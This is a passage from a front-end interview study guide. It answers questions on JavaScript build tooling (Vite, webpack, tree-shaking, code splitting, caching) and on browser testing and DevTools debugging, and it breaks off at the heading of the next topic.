**Vite** is the modern default: in dev it serves your source as native ESM (no bundling, so startup is near-instant and HMR is per-module), transforming files on demand with esbuild; in production it bundles with Rollup. **webpack** is the mature workhorse — slower, but its ecosystem and features (Module Federation, exotic loaders) are unmatched, so big established apps stay on it. **esbuild** is the speed engine — 10–100× faster than Babel — but historically thinner on code-splitting/plugin needs, so it's often used *inside* other tools. **Rollup** produces the cleanest output and is the go-to for shipping a library. Pick Vite for a new app, webpack if you need its ecosystem, Rollup to publish a package, esbuild when raw speed dominates.

### Q4. What is tree-shaking and what conditions must hold for it to work?

Tree-shaking is **dead-code elimination across the module graph** — the bundler drops exports nothing imports, so you ship only what you use.

Preconditions:

- **Static ESM.** `import { x } from 'y'` is statically analyzable; `require()` generally isn't. CommonJS deps often can't be shaken.
- **No (unmarked) side effects.** If importing a module *does* something (registers a global, mutates a prototype), the bundler must keep it. Packages declare `"sideEffects": false` in `package.json` to opt in; misdeclaring it drops needed code.
- **Preserved module structure until analysis.** Transpiling ESM down to CommonJS *before* the bundler sees it (an old Babel default) kills tree-shaking. Keep `import`/`export` intact for the bundler.

```javascript
// utils.js exports a, b, c
import { a } from './utils';  // b and c are shaken out — if utils has no side effects
```

Classic failure: importing from a package's CJS build, or a barrel `index.js` that re-exports everything with side effects, pulls the entire library in. The fix is per-path imports or the ESM build of the dependency.

### Q5. Why do we transpile code, and what's the difference between Babel, SWC, and TypeScript?

We **transpile** to bridge two gaps: (1) syntax the browser doesn't support yet (JSX, some modern JS) → equivalent supported JS, and (2) TypeScript types → plain JS.

- **Babel** — the long-standing JS transpiler; plugin-based, huge ecosystem, but JS-speed (slow on big codebases). Strips TS types, down-levels syntax via presets/targets.
- **SWC** — a Rust reimplementation of the same job; drop-in-ish and far faster. Powers Next.js and others.
- **TypeScript (`tsc`)** — both a **type checker** and a transpiler. This is the key distinction: Babel/SWC/esbuild **erase** types without checking them, so a build can succeed while your types are broken.

That's why real projects run type-checking as a **separate step** (`tsc --noEmit` in CI) while using SWC/esbuild for the fast transform in the actual build. Don't rely on the bundler's transpile step to catch type errors — it isn't looking.

### Q6. What are source maps and why do they matter?

A **source map** (`app.js.map`) is a JSON file that maps positions in the compiled/minified output back to your original source (TS, JSX, pre-minification). With it loaded, DevTools shows your real filenames, variable names, and line numbers when you set breakpoints or read a stack trace — debugging minified `a.js:1:48210` would otherwise be hopeless.

```
//# sourceMappingURL=app.9f2a1c.js.map   ← comment at end of the bundle
```

Practical points: ship source maps to your **error-tracking** service (so production stack traces symbolicate) but consider **not** serving them publicly if the source is sensitive — upload them to the monitoring tool instead, or serve them only to authenticated internal users. Generating them adds build time; `hidden-source-map` emits the file without the linking comment so browsers don't fetch it but tools can still use it.

### Q7. What is a bundle budget and how do you enforce it?

A **bundle budget** is a size ceiling you commit to and enforce automatically — e.g. "critical-path JS ≤ 170KB gzipped," "no route chunk over 250KB." It converts "the app feels heavy" into a CI gate.

Enforcement options:

- **webpack `performance.hints: 'error'`** with `maxAssetSize`/`maxEntrypointSize` — fails the build when a chunk is too big.
- **bundlesize / size-limit** — CLI tools you run in CI that fail the PR if a tracked file grows past its limit.
- **CI check on the analyzer output** — diff bundle size against the base branch and comment on the PR.

The point is to make growth **visible and blocking**. JavaScript size is the single biggest lever on load performance (it's downloaded *and* parsed *and* executed on the main thread), so a budget catches the "someone imported all of `lodash`" regression at PR time instead of after users complain. Tie the number to a device/network target (a mid-tier phone on 4G), not a hunch.

### Q8. How would you analyze and reduce a bundle that's too large?

**Measure first.** Run a bundle analyzer (webpack-bundle-analyzer, Rollup's visualizer, `vite-bundle-visualizer`) to get a treemap of what's actually in each chunk. Look for: giant single dependencies, duplicated packages (two versions of the same lib), whole libraries where you use one function, and code that could be lazy-loaded.

Then, in rough priority order:

1. **Code-split** — lazy-load routes and heavy components with dynamic `import()` so they're not in the initial chunk.
2. **Fix import shape** — `import debounce from 'lodash/debounce'` (or `lodash-es`) instead of `import _ from 'lodash'`.
3. **Replace heavy deps** — swap `moment` (large, non-tree-shakeable) for `date-fns`/`Temporal`; drop a UI kit you use 3 components of.
4. **Dedupe** — resolve duplicate versions (align peer deps, `resolutions`/`overrides`).
5. **Defer the non-critical** — analytics, chat widgets, polyfills behind feature detection.

The meta-point interviewers want: **don't guess, profile.** Show the analyzer, name the biggest offender, and give a concrete swap.

### Q9. What are micro-frontends, and when do they help versus hurt?

**Micro-frontends** extend the microservices idea to the UI: independently built and deployed front-end fragments, composed into one page/app at runtime (commonly via webpack **Module Federation**, which lets one app load code exported by another at runtime, sharing dependencies like a single React copy).

```
   host shell
   ├── loads remote "checkout"  (team A, own deploy)
   ├── loads remote "search"    (team B, own deploy)
   └── shares one React instance across remotes
```

**They help** when you have many teams that must ship independently, a large app where one build/deploy has become a bottleneck, or a gradual migration from a legacy stack — each team owns a slice end to end.

**They hurt** small teams and single-app products: you pay for duplicated dependencies (or fragile version-sharing), a runtime composition layer, harder end-to-end debugging, inconsistent UX across fragments, and more operational surface. For most apps a **monorepo with good module boundaries** gives you the code-organization benefit without the runtime cost. Reach for micro-frontends to solve an *organizational* scaling problem, not a technical one.

### Q10. What problems do monorepos solve, and what do they cost?

A **monorepo** puts many packages/apps in one repository with shared tooling (pnpm/Yarn/npm **workspaces** plus a build orchestrator like **Turborepo** or **Nx**).

**Benefits:** atomic cross-package changes (update a shared UI lib and its consumers in one PR), one version of tooling/lint/TS config, easy code sharing, and **task caching** — Turborepo/Nx skip rebuilding/testing packages whose inputs didn't change, which is the feature that makes big monorepos fast.

**Costs:** the repo gets large (partial clones, sparse checkout help), CI must be smart about only building affected packages, and access control is coarser than many small repos. Contrast with **polyrepo** (one repo per package): cleaner isolation and independent versioning, but painful cross-cutting changes and duplicated tooling.

The deciding factor is usually how often changes cross package boundaries. Frequent cross-cutting changes → monorepo. Truly independent products → polyrepo. Micro-frontends and monorepos are orthogonal: you can (and often do) develop federated micro-frontends inside one monorepo.

### Q11. How does long-term caching via content hashes work?

The trick is to make each asset's filename a function of its **contents**, then cache aggressively and *change the URL* whenever the content changes.

```http
GET /assets/app.9f2a1c.js
Cache-Control: public, max-age=31536000, immutable
```

- The bundler emits `app.<contenthash>.js`. Same bytes → same hash → same URL → served from cache. Change one line → new hash → new URL → the browser fetches it fresh.
- Because the URL is unique per version, you can send `max-age=1 year, immutable` and never revalidate — no `ETag` round-trip.
- The **HTML** (which references these hashed files) is served with `no-cache`/short TTL so users always get the current asset URLs.

Keep a **stable vendor chunk** (rarely-changing `node_modules`) separate from app code so a one-line app change doesn't bust the big vendor cache. Beware: putting a chunk's own module IDs into every other chunk can cause hashes to change unexpectedly — modern bundlers handle this, but it's the classic "why did every file's hash change" gotcha.

### Q12. What's the difference between the dev server and the production build?

They're two different code paths with opposite priorities.

**Dev server** — optimizes for *feedback speed*. Vite serves your source as native ESM, mostly unbundled, transforming each file on demand with esbuild; **HMR (Hot Module Replacement)** swaps a changed module into the running page without a full reload, preserving state. webpack's dev server bundles in-memory. No minification, full source maps, no aggressive optimization.

**Production build** — optimizes for *shipped size and runtime cost*. Full bundling, tree-shaking, minification, code splitting, content hashing, smaller source maps. Slow and thorough; run in CI.

The gotcha: **they can behave differently.** Unbundled dev-ESM can mask a dependency that breaks when bundled/minified, and dev doesn't exercise code splitting. Always test against a **production build** (`vite preview`, `serve dist/`) before shipping — "works in dev" is not "works in prod," which is exactly the class of bug the debugging topic covers.

### Q13. How do you think about the cost of adding an npm dependency?

Every dependency is a liability with several cost dimensions:

- **Bytes shipped** — does it add to the bundle the user downloads/parses? Check its size on a size tool before adding; a 300KB date library for one `format()` call is a bad trade.
- **Tree-shakeability** — ESM with `sideEffects: false` shakes well; a CJS monolith ships whole.
- **Transitive deps** — one install can pull a subtree. `npm ls` / lockfile shows the real footprint.
- **Maintenance & security** — active repo, recent commits, open CVEs (per best practice: prefer popular, actively maintained libraries).
- **Duplication** — does it bring a second copy of something you already have?

The rule of thumb: for something small and well-understood (a debounce, a clsx-style helper, a UUID), consider **writing the few lines yourself** rather than taking a dependency and its supply-chain/size risk. For something genuinely hard (date/time with zones, a virtualization engine, a crypto primitive), take the well-maintained library. Always weigh "what does this cost my users' download budget" against "what does it save my team."

### Q14. What is code splitting and how do you decide split points?

**Code splitting** breaks one big bundle into chunks loaded on demand, so the initial download only contains what the first screen needs.

```javascript
// Route-based split — the dashboard chunk loads only when navigated to
const Dashboard = lazy(() => import('./routes/Dashboard'));

// Interaction-based split — load the heavy editor when the user opens it
button.addEventListener('click', async () => {
  const { openEditor } = await import('./editor');
  openEditor();
});
```

Good split points:

- **Per route** — the biggest win; users rarely visit every route.
- **Behind interaction** — modals, editors, charts that appear on click.
- **Vendor vs app** — a stable vendor chunk caches across app deploys.
- **Below the fold / non-critical** — analytics, third-party widgets.

Don't over-split: each chunk is a request and too many tiny chunks add waterfall latency and overhead (though HTTP/2 multiplexing softens this). Split where there's a real chance the code *isn't needed on this visit*. This directly reduces LCP/INP by shrinking the JS the main thread must parse and execute up front.

### Q15. What's the difference between dependencies, devDependencies, and peerDependencies?

- **`dependencies`** — needed at **runtime** by your shipped code (React, a date lib). These end up in your bundle.
- **`devDependencies`** — needed only to **build/test** (bundler, TS, ESLint, test runner). Not installed by consumers of your published package; not in the runtime bundle.
- **`peerDependencies`** — packages your library expects the **host app to provide** (a React component library declares `react` as a peer so it uses the app's single React copy, not a bundled duplicate).

For an **application** the dep/devDep split mostly affects install size and clarity — everything you import into shipped code is a `dependency`. For a **published library**, the distinction is load-bearing: bundling something that should be a peer (React) causes the dreaded "two copies of React" hooks error. Lockfiles (`package-lock.json`/`pnpm-lock.yaml`) pin the exact resolved versions of all of these for reproducible builds — commit them.

### Q16. Walk through what happens from `git push` to a cached asset in the user's browser.

End to end, the build-and-delivery pipeline:

```
push → CI: install (from lockfile) → typecheck (tsc --noEmit)
     → build (bundle, tree-shake, minify, split, content-hash)
     → emit dist/: index.html + app.<hash>.js + vendor.<hash>.js + *.map
     → deploy: upload to CDN/origin
browser → GET / → index.html (Cache-Control: no-cache)
        → parses HTML, finds <script src="/assets/app.9f2a1c.js">
        → GET hashed assets (Cache-Control: immutable, max-age=1yr)
        → next deploy changes only changed files' hashes → only those refetched
```

The key ideas tying the topic together: the **lockfile** makes the install reproducible; **typecheck is a separate gate** from the transform; the **content hash** is what lets the CDN cache assets immutably while the `no-cache` HTML always points at the current versions; and **code splitting** means the browser only fetches the chunks this page needs. A one-line CSS change should re-hash one CSS chunk and leave the big vendor JS chunk cached — if your build re-hashes everything on every deploy, your chunking/hashing config is wrong and users refetch the world each release.

## Front-End Testing & Debugging

### Summary

**What this topic covers**

How you gain confidence that a browser front end works, and how you find out why it doesn't. It splits into two halves. **Testing:** the front-end testing pyramid (unit → component → e2e), **Testing Library**'s query-by-role/behaviour philosophy, the **jsdom** simulated-DOM environment and where it falls short, real-browser **end-to-end** tools (Playwright, Cypress), **mocking the network** at the boundary with MSW, and snapshot/visual-regression testing plus the special cases of hooks and async UI. **Debugging:** driving DevTools like an instrument — breakpoints and the Sources panel, the **Network** panel for request problems, the **Performance** panel for jank, the **Memory** panel for leaks — and the discipline of reproducing and diagnosing "works on my machine" browser issues. The 16 questions here are deliberately cross-referenced with the general **Testing primer**; this topic keeps the *browser-specific* angle — testing DOM behaviour, mocking `fetch`, catching detached-node leaks — rather than restating the pyramid theory.

**Mental model**

Two mental models, one per half. For **testing**, think **confidence per dollar**: every test costs time to write, run, and maintain, and buys you some confidence a user-facing behaviour works. Cheap unit tests buy a little; expensive e2e tests buy a lot but are slow and flakier. You want most tests at the **component** level — rendered DOM, interacted with the way a user would (Testing Library), network mocked at the boundary (MSW) — because that's the best confidence-to-cost ratio for UI. Test **behaviour, not implementation**: assert what the user sees and can do, never internal state or a component's private methods. For **debugging**, think like an investigator: **reproduce → observe → localize → fix → verify.** Don't read code hoping to spot the bug; make the browser *show* you — which network request failed, which function is eating the frame budget, which objects aren't being collected. DevTools is your evidence-gathering kit; a breakpoint or a Performance recording tells you the truth that guessing won't. The unifying discipline across both halves is **measure/observe before you change.**

**Key terms**

- **Testing pyramid (FE)** — many fast unit tests, a solid middle of component tests, few slow e2e tests.
- **Testing Library** — a family of libraries that query the DOM the way users do (by role, label, text) and discourage implementation-detail assertions.
- **query by role/behaviour** — `getByRole('button', { name: /save/i })` over `querySelector('.btn')`; resilient to refactors, aligned with accessibility.
- **jsdom** — a pure-JS implementation of DOM/HTML APIs so tests run in Node without a browser; fast but not a real browser.
- **Playwright / Cypress** — real-browser e2e tools that drive an actual page (click, type, navigate) and assert on it.
- **MSW (Mock Service Worker)** — intercepts network requests at the boundary (Service Worker in browser, request interception in Node) so code under test hits realistic fake endpoints.
- **snapshot test** — asserts output matches a stored reference; catches unintended changes but is noisy if overused.
- **visual regression** — screenshots a rendered UI and diffs pixels against a baseline to catch visual breakage.
- **breakpoint** — a pause point in the Sources panel; conditional/logpoint variants pause or log without editing code.
- **Network panel** — shows every request: status, timing waterfall, headers, payload; where you diagnose failed/slow/duplicated requests.
- **Performance panel** — records a timeline of main-thread work (scripting, layout, paint) to find long tasks and jank.
- **Memory panel** — heap snapshots and allocation timelines to find leaks (detached nodes, retained closures).
- **flaky test** — passes/fails nondeterministically, usually from timing/async or shared state; the enemy of e2e trust.

**Why interviewers ask this**

Testing and debugging are where interviewers distinguish "can write a feature" from "can own a feature in production." On testing, the senior signal is **knowing what to test and at what level** — writing a couple of high-value component tests with the network mocked, rather than 40 brittle tests asserting internal state that break on every refactor. Candidates who reach for `getByRole` and mock at the boundary have felt the pain of implementation-coupled tests; ones who snapshot everything or test private methods haven't. On debugging, the signal is **method over luck**: presented with "the page is slow" or "it leaks," do you open the right panel and gather evidence, or do you start randomly editing code? Interviewers love "works on my machine" precisely because the answer reveals whether you understand cross-browser/device variance, caching, and how to reproduce systematically. Concrete tool fluency ("I'd take a heap snapshot, filter to detached nodes...") beats vague theory every time.

**Common confusions**

- "More tests = better." Past a point, brittle implementation-coupled tests cost more than they buy; confidence-per-cost is the metric.
- "jsdom is a browser." It's a DOM *simulation* — no real layout/paint, no true `getBoundingClientRect`, gaps in some APIs. Real-browser behaviour needs Playwright/Cypress.
- "Snapshot tests catch bugs." They catch *changes*; a wrong output snapshotted becomes the new 'correct.' Use sparingly and review diffs.
- "Mock `fetch` directly." Mocking the boundary (MSW) is more realistic than stubbing `fetch`/modules; your code exercises its real request logic.
- "e2e should cover everything." e2e is slow and flaky; cover critical user journeys, push detail down to component tests.
- "The Performance panel and Network panel are interchangeable." Network = requests/waterfall; Performance = main-thread CPU/rendering. Different problems.
- "A memory leak means a crash." Usually it's gradual slowdown and growth; you diagnose it by comparing heap snapshots, not by waiting for a crash.

**What follows from this topic**

Debugging with the Performance and Memory panels is the practical arm of the runtime-performance and Core Web Vitals material — you *find* the long task or the detached-node leak here that those topics teach you to avoid. Network-panel debugging connects to the HTTP/caching topics (spotting a missing `Cache-Control`, a redundant request, a CORS failure). The network-mocking discussion links to the state-and-data-fetching topic. And this whole topic is the browser-flavoured companion to the general **Testing primer** — go there for the pyramid theory and language-agnostic patterns, stay here for DOM/`fetch`/leak specifics. It all comes together in the **Scenario & Interview Playbooks** topic, where "debug a slow page" and "find a memory leak" are live exercises.

### Q1. What does the front-end testing pyramid look like, and why is the middle so important?

```
        ╱  e2e  ╲        few  — real browser, whole journeys, slow, flaky
      ╱ component ╲      many — rendered DOM, user interactions, network mocked
    ╱    unit       ╲    lots — pure functions, reducers, utils, fast
   ─────────────────
      static (types/lint)  — free, catches whole classes of bugs
```

- **Static** (TypeScript, ESLint) is the free base — it eliminates typos and type errors before any test runs.
- **Unit** tests cover pure logic (formatters, reducers, hooks in isolation) — fast and cheap but low confidence about the actual UI.
- **Component** tests render a real component into jsdom, interact like a user (Testing Library), and mock the network (MSW). This layer is emphasized because it gives the **best confidence-to-cost ratio** for a UI: you test real rendering and behaviour without the slowness of a browser.
- **e2e** drives a real browser through critical journeys (login, checkout) — highest confidence, but slow and flaky, so keep it few.

Kent C. Dodds' "testing trophy" reframes the classic pyramid to make the **component/integration** middle the fattest layer — for front ends, that's the right emphasis. Cross-reference the Testing primer for the general theory.

### Q2. Why does Testing Library push you to query by role and text instead of by class or test id?

Because tests should assert **what the user experiences**, not **how the component is built**. A user finds a button by its accessible role and label — not by `.btn-primary-v2`. Querying that way makes tests resilient to refactors and doubles as an accessibility check.

```javascript
// ✅ behaviour: how a user (and a screen reader) finds it
const save = screen.getByRole('button', { name: /save/i });
await userEvent.click(save);
expect(screen.getByText(/saved/i)).toBeInTheDocument();

// ❌ implementation detail: breaks when the class or structure changes
const save = container.querySelector('.btn-primary');
```

The query priority is roughly: **role → label/placeholder/text → test id (last resort).** If `getByRole` can't find your element, that's often a real accessibility bug (a `<div onClick>` with no role). `getByTestId` exists as an escape hatch but signals you couldn't reach the element the way a user would. This philosophy — behaviour over implementation — is the whole point of the library, and the single biggest driver of tests that survive refactors.

### Q3. What is jsdom and where does it fall short?

**jsdom** is a pure-JavaScript implementation of web platform APIs (DOM, HTML, events, `fetch` shims) that runs in Node, so component tests execute fast without launching a browser. It's what Jest/Vitest use by default for DOM tests.

Where it falls short — because it **simulates** the DOM rather than rendering it:

- **No real layout or paint.** `getBoundingClientRect()` returns zeros; element sizes/positions aren't computed. Anything geometry-dependent (scroll position, `IntersectionObserver` visibility, "is this in the viewport") can't be truly tested.
- **No real CSS rendering.** Styles apply as data but nothing is painted; you can't test that something is visually hidden by `overflow` or a media query.
- **Missing/partial APIs.** `matchMedia`, `IntersectionObserver`, `ResizeObserver`, canvas, and others often need polyfills/mocks.
- **Not a specific browser.** It won't reproduce Safari-vs-Chrome quirks.

So use jsdom for behaviour and DOM structure; when you need **real rendering, layout, or cross-browser truth**, move to Playwright/Cypress in an actual browser. Knowing this boundary is exactly what stops "passes in jsdom, breaks in the browser" surprises.

### Q4. When do you reach for Playwright or Cypress instead of component tests?

Use real-browser **e2e** tools when the thing you need confidence in only exists in a real browser: full user journeys across pages, real navigation/history, actual layout and rendering, real network, multiple tabs/origins, file downloads, or cross-browser behaviour.

- **Playwright** — drives Chromium/Firefox/WebKit via one API; strong **auto-waiting** (it waits for elements to be actionable, reducing flakiness), parallelism, tracing, and network interception. Great for cross-browser and CI.
- **Cypress** — runs in the browser with an excellent interactive runner and time-travel debugging; historically Chromium-family-focused, single-tab model.

The tradeoff is confidence vs cost: e2e gives the highest confidence but is **slow and the most flake-prone** (timing, environment, data). So cover a small set of **critical paths** (can a user log in, search, and check out?) and let component tests handle the combinatorial detail. A common mistake is pushing detailed edge-case coverage into e2e — it becomes a slow, flaky suite everyone ignores. Keep e2e few, high-value, and stable.

### Q5. How do you mock the network in tests, and why is MSW preferred over stubbing fetch?

Mock at the **network boundary**, not inside your code. **MSW (Mock Service Worker)** intercepts outgoing requests — via a Service Worker in the browser, via request interception in Node — and returns handler-defined responses, so your code runs its *real* request logic (real `fetch` calls, headers, error handling) against a fake server.

```javascript
import { http, HttpResponse } from 'msw';
import { setupServer } from 'msw/node';

const server = setupServer(
  http.get('/api/users', () => HttpResponse.json([{ id: 1, name: 'alice' }])),
);
beforeAll(() => server.listen());
afterEach(() => server.resetHandlers());
afterAll(() => server.close());
```

Why this beats stubbing `fetch` or mocking your data module:

- **Realistic** — exercises your actual fetch/parse/error paths; a stubbed `fetch` skips them.
- **Refactor-proof** — swap `fetch` for `axios` and the tests don't change; you mocked the endpoint, not the client.
- **Reusable** — the same handlers power tests, Storybook, and local dev.
- **Easy failure simulation** — override a handler to return 500/timeout to test error/loading states.

Mocking the boundary is the front-end application of "mock at the network boundary, not internal functions."

### Q6. What are snapshot and visual-regression tests good for, and how do they go wrong?

**Snapshot tests** serialize a component's rendered output (or any value) to a stored file and fail if it changes.

```javascript
expect(render(<Price value={9.99} />).container).toMatchSnapshot();
```

**Visual-regression tests** screenshot the *rendered* UI in a real browser and diff pixels against a baseline (Playwright's `toHaveScreenshot`, Percy, Chromatic) — catching visual breakage (layout shift, wrong color, missing element) that a DOM assertion misses.

How they go wrong:

- **Snapshots catch *change*, not *correctness*.** If the first snapshot is already wrong, it's enshrined as "correct." Reviewers rubber-stamp `-u` updates, so regressions sail through.
- **Noise.** Huge or frequently-changing snapshots produce constant diffs people stop reading.
- **Visual flakiness.** Antialiasing, fonts, and animation cause false pixel diffs; you need consistent rendering environments and threshold/masking config.

Use them **narrowly**: small, meaningful snapshots you'll actually review, and visual regression on a few stable, high-value screens. Prefer explicit behavioural assertions (`getByRole`, `getByText`) for logic; reserve snapshots/screenshots for catching *unintended* output changes.

### Q7. How do you test a custom hook or async UI?

**Custom hooks** — a hook can't run outside a component, so either test it through a component that uses it (preferred — tests real behaviour) or with a harness like Testing Library's `renderHook`:

```javascript
const { result } = renderHook(() => useCounter());
act(() => result.current.increment());
expect(result.current.count).toBe(1);
```

**Async UI** — the key rule is **don't assert before the update happens; wait for it.** Fire the action, then use async queries/`waitFor` so the assertion retries until the DOM settles:

```javascript
await userEvent.click(screen.getByRole('button', { name: /load/i }));
expect(await screen.findByText(/alice/i)).toBeInTheDocument(); // findBy retries
```

- `findBy*` and `waitFor` poll until the element appears / assertion passes (or time out) — this is how you handle promises, MSW responses, debounced updates.
- Wrap state-updating calls in `act()` so React flushes effects before you assert (Testing Library's `userEvent` does this for you).
- Test the **states a user sees**: loading → data, and loading → error (drive the error with an MSW override). Avoid asserting intermediate internal flags.

### Q8. Walk through debugging a "works on my machine" browser bug.

Method beats luck. **Reproduce → isolate the variable → fix → verify.**

First, **reproduce it somewhere other than the reporter's machine** and figure out *what differs*. The usual suspects, checked in order:

1. **Stale cache/build** — hard reload, clear Service Worker, test in an incognito window. "Works for me" is often "I have an old bundle cached" (or *they* do).
2. **Browser/engine** — Safari/WebKit vs Chrome/Blink differ (date parsing, flexbox quirks, `Intl`, unsupported APIs). Reproduce in their browser/version; check caniuse for the feature.
3. **Device/viewport** — mobile Safari, small screens, touch vs mouse, DPR. Use device emulation and, ideally, a real device.
4. **Data/state** — their account has data yours doesn't; a null field, an empty list, a huge list. Reproduce with their data shape.
5. **Network conditions** — throttle to Slow 4G/offline; race conditions and timeouts only show on slow links.
6. **Extensions/locale/timezone** — ad blockers, a different locale or timezone changing formatting/parsing.

Then reproduce in DevTools with the right panel (Console for errors, Network for failed requests, Performance for slowness), fix, and **verify under the conditions that triggered it** — not just under yours. The whole game is turning "works on my machine" into a known, controlled difference.

### Q9. How do you use breakpoints effectively in the Sources panel?

Beyond a plain line breakpoint (click the gutter, execution pauses, inspect scope/call-stack/watch):

- **Conditional breakpoint** — right-click the gutter, add an expression; pauses only when `user.id === 42`. Essential for a loop that only misbehaves on one item.
- **Logpoint** — logs an expression when hit *without* pausing and *without* editing code to add `console.log` (which you'll forget to remove).
- **DOM breakpoints** — in Elements, "break on subtree/attribute modifications" pauses when *anything* changes a node; finds the mystery code mutating your element.
- **Event listener breakpoints** — break on any `click`, `scroll`, `fetch`, etc., when you don't know which handler runs.
- **XHR/fetch breakpoints** — pause when a request to a matching URL fires.
- **`debugger;` statement** — a breakpoint in source, handy for conditionally-loaded code.

While paused: step over/into/out, read the **Scope** pane (closures included — directly useful for the closure-leak material), walk the **Call Stack**, and use **blackboxing** to skip framework/node_modules frames so you stay in your code. Breakpoints beat `console.log` because you get the *whole* live state, not the one value you thought to print.

### Q10. What can the Network panel tell you, and how do you read a request waterfall?

The Network panel logs every request with status, type, size, and a **timing waterfall**. You use it to diagnose the whole loading story:

- **Failures** — red 4xx/5xx, CORS errors (check the request's response headers for `Access-Control-Allow-*`), blocked mixed content.
- **Waterfalls** — bars show when each request starts/ends. A **staircase** (each request starts only after the previous finishes) means a dependency chain — a request waterfall — that you want to parallelize or preload.
- **Timing breakdown** (hover a bar): DNS → initial connection/TLS → **TTFB** (waiting for the server) → content download. A long TTFB is a server/CDN problem; long download is size/bandwidth.
- **Caching** — "from disk/memory cache" or a `304`; check `Cache-Control`/`ETag` on responses to confirm assets cache as intended.
- **Redundancy** — the same request fired 3×, or a huge unexpected payload.
- **Throttling** — set "Slow 4G" to feel what users feel; "Disable cache" to test first-load.

Reading a waterfall is the core skill for the "why is this page slow to load" scenario: find the long pole (big TTFB? a blocking chain? an oversized asset?) before optimizing anything.

### Q11. How do you use the Performance panel to diagnose jank?

Record a Performance profile while reproducing the jank (a scroll, an interaction), then read the **main-thread flame chart**.

What to look for:

- **Long tasks** — any task >50ms (flagged with a red triangle) blocks the main thread, so input can't be handled and frames drop. These are your INP/responsiveness killers.
- **The frame budget** — to hit 60fps you have ~16.6ms per frame. Frames that overrun show as dropped; the chart shows *what* overran (scripting/yellow, layout/purple, paint/green).
- **Forced reflow / layout thrashing** — purple "Layout" bars triggered repeatedly inside a script, with DevTools' "Forced reflow is a likely performance bottleneck" warning — you're reading a layout property (`offsetHeight`) after writing one, in a loop.
- **Scripting hot spots** — expand a long task to the call tree / bottom-up view to find the expensive function.

The workflow: record → find the longest task or the frame that blew the budget → drill into its call stack → attribute it to your code → fix (break up the task, defer work, batch DOM reads/writes, memoize). This panel is where the abstract "don't block the main thread" rule becomes a concrete, named function you can point at.

### Q12. How do you find a memory leak with the Memory panel?

A front-end leak = objects that stay reachable after they should be gone, so the heap grows over time (gradual slowdown, eventual crash). Find it by evidence, not guessing:

1. **Confirm growth** — use the Performance monitor or take **heap snapshots** before and after repeating an action (e.g. open a modal, close it, ×10). If heap climbs and never returns after GC, you're leaking.
2. **Compare snapshots** — take snapshot A, do the action N times, take snapshot B. Switch the summary to **"Objects allocated between A and B"** to see what survived that should have been freed.
3. **Filter to "Detached"** — detached DOM nodes (elements removed from the document but still referenced by JS) are the classic front-end leak; they show up as `Detached HTMLDivElement`.
4. **Follow retainers** — select a leaked object and read the **Retainers** tree to see *what still points to it* — usually a forgotten event listener, a `setInterval` never cleared, a closure capturing the node, or a growing global array/Map.

The usual culprits: listeners/timers not cleaned up on teardown, closures holding detached nodes, unbounded caches, and framework effects without cleanup. The Retainers path names the exact reference to remove — this is the diagnostic half of the runtime-performance topic's "memory leaks" list.

### Q13. Testing behaviour vs implementation — what's the practical difference in a component test?

**Implementation testing** asserts *how* the component works internally — state values, which private method ran, prop plumbing. **Behaviour testing** asserts *what the user can observe and do* — what's on screen, what happens on interaction.

```javascript
// ❌ implementation: couples the test to internals; breaks on refactor
expect(wrapper.state('isOpen')).toBe(true);
expect(wrapper.instance().handleToggle).toHaveBeenCalled();

// ✅ behaviour: survives refactors; tests what matters
await userEvent.click(screen.getByRole('button', { name: /menu/i }));
expect(screen.getByRole('menu')).toBeVisible();
```

The practical payoff: behaviour tests keep passing when you rename a state variable, switch class components to hooks, or restructure the DOM — as long as the user-facing behaviour is unchanged. Implementation tests fail on every such refactor, so they *punish* good refactoring and teams learn to avoid changing tested code. They also give false confidence: `state.isOpen === true` doesn't prove the menu actually rendered. Rule of thumb: if a test would break on a refactor that a user wouldn't notice, it's testing the wrong thing.

### Q14. Why are e2e tests flaky, and how do you reduce flakiness?

Flaky = nondeterministic pass/fail. Root causes in the browser:

- **Timing/async** — asserting before the app finished updating; the top cause.
- **Fixed sleeps** — `wait(500)` that's too short on a slow CI runner.
- **Shared/leftover state** — a previous test's data or a logged-in session bleeding into the next.
- **Real network/third parties** — an external API being slow or down.
- **Animations, focus, order-dependence.**

Fixes:

- **Auto-waiting / web-first assertions** — let Playwright wait for an element to be actionable/visible instead of sleeping; assert `toBeVisible()` which retries. Never a raw `sleep`.
- **Deterministic data** — reset the DB/seed per test; mock external/third-party calls (MSW or route interception) so only *your* system is under test.
- **Isolation** — independent tests, fresh context/storage per test, no order dependence.
- **Stable selectors** — role/label or dedicated `data-testid`, not brittle CSS paths.
- **Quarantine + fix** — never `retry` a flaky test into green and move on; retries hide real races. Track and fix them, because a flaky suite is one everyone learns to ignore.

### Q15. Your test passes in jsdom but the feature breaks in the real browser. What's going on and what do you do?

This is jsdom's simulation gap biting you. Likely causes:

- **Layout/geometry** — the feature depends on real sizes/positions (`getBoundingClientRect`, scroll, `IntersectionObserver` visibility) that jsdom fakes as zeros, so the test never exercised the real path.
- **Unimplemented/polyfilled APIs** — you mocked `matchMedia`/`ResizeObserver`/canvas in the test, so the test passed against the mock while the real API behaves differently.
- **CSS-dependent behaviour** — something hidden by `overflow`/media query renders "present" in jsdom (which doesn't do visual layout).
- **Real async/timing or browser quirks** — event ordering, microtask timing, or a WebKit/Blink difference jsdom can't model.

What to do: **move the assertion to the layer that can see the truth.** Add a **Playwright/Cypress** test for the geometry/rendering-dependent behaviour in a real browser; keep jsdom for the pure DOM-structure/logic parts. The lesson interviewers want: know *what jsdom can and can't tell you*, and don't trust a green jsdom test for something that fundamentally needs layout, paint, or real browser semantics.

### Q16. Given "the app feels slow after a while," how do you approach it?

"After a while" strongly implies a **leak or unbounded growth**, not a one-off slow load — so this is a runtime, not a loading, investigation. Approach it as evidence-gathering:

1. **Reproduce and characterize.** Does it degrade with *time*, with *actions repeated*, or with *data accumulating*? Use the app the way the reporter does. Watch the **Performance monitor** for a climbing JS heap / node count / listener count.
2. **Memory panel** — take heap snapshots before and after repeating the suspect action ×N; compare, filter to **detached nodes**, and follow **retainers** to the reference that won't die (a listener/timer/closure never cleaned up, or a Map/array that only grows).
3. **Performance panel** — if it's CPU rather than memory, record during the slow state and look for **long tasks** and **forced reflows** that weren't there when fresh (e.g. an ever-growing list re-rendered unvirtualized, or handlers stacking up).
4. **Fix the root cause** — clean up listeners/timers on teardown, bound caches, virtualize large lists, remove duplicate subscriptions.
5. **Verify** — re-run the snapshot/record loop and confirm the heap returns to baseline after GC and frames stay under budget.

The headline: **measure before you touch code**, and let the Memory/Performance panels name the exact culprit rather than guessing.

## Front-End Scenario & Interview Playbooks

### Summary

**What this topic covers**

